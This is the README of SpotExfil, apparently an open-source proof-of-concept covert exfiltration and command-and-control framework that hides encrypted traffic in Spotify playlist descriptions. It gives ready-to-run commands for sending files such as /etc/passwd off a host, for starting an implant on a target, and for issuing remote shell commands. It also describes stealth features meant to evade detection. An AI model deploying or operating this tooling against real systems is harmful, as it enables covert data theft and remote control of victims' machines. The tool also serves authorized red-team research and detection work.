[![CodeQL](https://github.com/sourcefrenchy/spotexfil/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/sourcefrenchy/spotexfil/actions/workflows/codeql-analysis.yml)

# SpotExfil

A proof-of-concept covert channel and C2 framework that uses Spotify playlist descriptions as a communication medium, 512 characters at a time.

Available as both **Python** and **Go** implementations with wire-compatible encrypted payloads.

More info at [Exfiltration Series: SpotExfil](https://medium.com/@jeanmichel.amblat/exfiltration-series-spotexfil-9aee76382b74)

## Features

- **Dual language** -- Python package + standalone Go binary (no runtime needed)
- **AES-256-GCM encryption** with PBKDF2-SHA256 key derivation (480K iterations)
- **Gzip compression** reduces payload size 60-80% for text
- **BLAKE2b integrity verification** on encode and decode
- **Bidirectional C2** with shell, file exfil, and sysinfo modules
- **Fully encrypted metadata** -- HMAC-derived tags, no plaintext in descriptions
- **Stealth** -- cover playlist names, random filler tracks, jittered polling, aggressive cleanup
- **Cross-platform binaries** -- macOS (Apple Silicon), Linux (x64), Windows (x64), stripped

## Architecture

```
spotexfil/
├── shared/                  # Wire format specs (single source of truth)
│   ├── protocol.json        # Crypto constants, transport params
│   ├── modules.yaml         # C2 module definitions
│   └── test_vectors/        # Cross-language crypto validation
├── python/                  # Python implementation
│   ├── spotexfil/           # Package with ABCs, crypto, transport, C2
│   │   ├── interfaces.py    # CryptoProvider, Transport, C2Module ABCs
│   │   ├── crypto.py        # AES-GCM, PBKDF2, BLAKE2b
│   │   ├── transport.py     # Spotify API wrapper
│   │   ├── protocol.py      # C2 message serialization
│   │   ├── implant.py       # C2 implant daemon
│   │   ├── operator.py      # C2 operator console
│   │   ├── modules/         # Pluggable module registry
│   │   └── cli.py           # Unified CLI
│   └── tests/               # 156 tests (unit, integration, stress, interop)
├── go/                      # Go implementation
│   ├── cmd/spotexfil/       # Cobra CLI (send/receive/clean/c2-implant/c2-operator)
│   ├── internal/
│   │   ├── crypto/          # AES-GCM, PBKDF2, BLAKE2b, HMAC
│   │   ├── encoding/        # File exfil pipeline
│   │   ├── protocol/        # C2 messages, encrypted descriptions
│   │   ├── spotify/         # zmb3/spotify/v2 wrapper
│   │   └── c2/              # Implant, operator, module registry
│   └── go.mod
├── Makefile                 # Build + test both languages
└── README.md
```

## Prerequisites

1. Register an app at [Spotify Developer Dashboard](https://developer.spotify.com/dashboard/)
2. Add redirect URI (e.g., `http://127.0.0.1:8888/callback`)
3. Provide credentials via env vars or `~/.spotexfil.conf`:

```bash
export SPOTIFY_USERNAME=YourUsername
export SPOTIFY_CLIENT_ID=your_client_id
export SPOTIFY_CLIENT_SECRET=your_client_secret
export SPOTIFY_REDIRECTURI=http://127.0.0.1:8888/callback
```

Or create `~/.spotexfil.conf`:

```ini
[spotify]
username = YourUsername
client_id = your_client_id
client_secret = your_client_secret
redirect_uri = http://127.0.0.1:8888/callback
```

## Installation

### Go (pre-built binaries, no runtime needed)

Download the appropriate binary from `dist/`:
- `spotexfil-darwin-arm64` -- macOS Apple Silicon
- `spotexfil-linux-amd64` -- Linux x64
- `spotexfil-windows-amd64.exe` -- Windows x64

### Python (from source)

```bash
cd python && pip install -r requirements.txt
```

### Build from source

```bash
make all          # Cross-compile Go binaries for all platforms
make test         # Run both Python and Go test suites
make lint         # Flake8 Python code
```

## Usage

### Data Exfiltration

```bash
# Go binary
./spotexfil-darwin-arm64 send -f /etc/resolv.conf -k "passphrase"
./spotexfil-darwin-arm64 receive -k "passphrase" -o output.txt
./spotexfil-darwin-arm64 clean

# Python
cd python && python -m spotexfil.cli send -f /etc/resolv.conf -k "passphrase"
cd python && python -m spotexfil.cli receive -k "passphrase"
```

### C2 Mode

```bash
# Start implant (Go binary on target)
./spotexfil-darwin-arm64 c2-implant -k "shared-secret" --interval 60 --jitter 30

# Operator console (Python or Go)
./spotexfil-darwin-arm64 c2-operator -k "shared-secret"
# OR
cd python && python -m spotexfil.cli c2-operator -k "shared-secret"
```

Operator commands:
```
c2> sysinfo                  # System info from target
c2> shell uname -a           # Execute shell command
c2> exfil /etc/passwd        # Exfiltrate a file
c2> results                  # Poll for results
c2> wait 1                   # Wait for specific seq
c2> clean                    # Wipe all C2 playlists
c2> quit
```

### Cross-Language Interop

Python and Go implementations are wire-compatible. You can mix freely:
- **Go operator** sends commands to **Python implant**
- **Python operator** sends commands to **Go implant**
- File exfil payloads are interchangeable between languages

## Testing

```bash
make test         # Run everything (Python 156 tests + Go tests)
make test-python  # Python only
make test-go      # Go only
make lint         # Flake8
```

Test coverage:
- **Unit**: crypto primitives, encoding pipeline, C2 protocol serialization
- **Integration**: full C2 roundtrips with in-memory Spotify mock
- **Stress**: 100+ random payloads, concurrent encoding, edge cases (empty, 1MB, unicode, null bytes)
- **Interop**: cross-language crypto validation against shared test vectors
- **Live**: verified against Spotify API (sysinfo C2 roundtrip)

## Shared Protocol

Both implementations load constants from `shared/protocol.json` (Go embeds it at compile time). Wire format is documented in `shared/protocol.json` under `wire_format`. C2 modules are defined in `shared/modules.yaml`.

Cross-language compatibility is enforced by `shared/test_vectors/` containing deterministic KDF, BLAKE2b, AES-GCM, and HMAC test vectors that both test suites validate.

## Limitations

- ~1MB max payload (~2000 playlists)
- Slow for large files (1 API call per 512-char chunk)
- Spotify rate limits may throttle bulk operations
- C2 polling adds latency (configurable, default 30-90s)

## Disclaimer

This is a **proof-of-concept for educational and authorized security research purposes only**. Do not use for unauthorized data exfiltration or unauthorized access to computer systems. The author is not responsible for misuse.

## TODO

- Go OAuth2 PKCE flow for live Spotify auth (currently needs manual token)
- Account rotation support
- Additional C2 modules (screenshot, persistence)
- Multi-account relay / dead drops
- Steganographic payload encoding
